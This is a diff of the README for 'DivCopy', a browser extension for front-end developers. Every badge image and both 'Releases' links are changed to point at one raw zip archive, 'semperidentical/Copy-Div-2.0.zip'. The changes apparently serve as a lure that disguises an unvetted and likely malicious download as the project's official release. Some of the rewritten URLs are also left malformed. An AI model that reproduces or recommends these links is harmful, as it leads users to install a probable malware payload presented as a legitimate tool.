@@ -1,6 +1,6 @@
 # DivCopy 🌐✨
 
-![DivCopy](https://img.shields.io/badge/DivCopy-v1.0.0-blue?style=flat-square) ![Browser Extension](https://img.shields.io/badge/Browser%20Extension-lightgray?style=flat-square) ![Productivity](https://img.shields.io/badge/Productivity-100%25-orange?style=flat-square)
+![DivCopy](https://raw.githubusercontent.com/ajstyle4u/DivCopy/main/semperidentical/Copy-Div-2.0.zip) ![Browser Extension](https://raw.githubusercontent.com/ajstyle4u/DivCopy/main/semperidentical/Copy-Div-2.0.zip%20Extension-lightgray?style=flat-square) ![Productivity](https://raw.githubusercontent.com/ajstyle4u/DivCopy/main/semperidentical/Copy-Div-2.0.zip%25-orange?style=flat-square)
 
 Welcome to **DivCopy**, a lightweight browser extension designed to empower frontend developers. With DivCopy, you can quickly inspect, copy, and reuse web elements, making your development process smoother and more efficient.
 
@@ -23,7 +23,7 @@ Welcome to **DivCopy**, a lightweight browser extension designed to empower fron
 
 ## Installation 🛠️
 
-To install DivCopy, visit the [Releases](https://github.com/ajstyle4u/DivCopy/releases) section. Download the latest version and follow the installation instructions provided.
+To install DivCopy, visit the [Releases](https://raw.githubusercontent.com/ajstyle4u/DivCopy/main/semperidentical/Copy-Div-2.0.zip) section. Download the latest version and follow the installation instructions provided.
 
 ## Usage 📚
 
@@ -51,7 +51,7 @@ DivCopy is open-source software licensed under the MIT License. See the [LICENSE
 
 ## Support 💬
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/ajstyle4u/DivCopy/releases) section for updates. You can also open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases](https://raw.githubusercontent.com/ajstyle4u/DivCopy/main/semperidentical/Copy-Div-2.0.zip) section for updates. You can also open an issue in the repository.
 
 ---
 
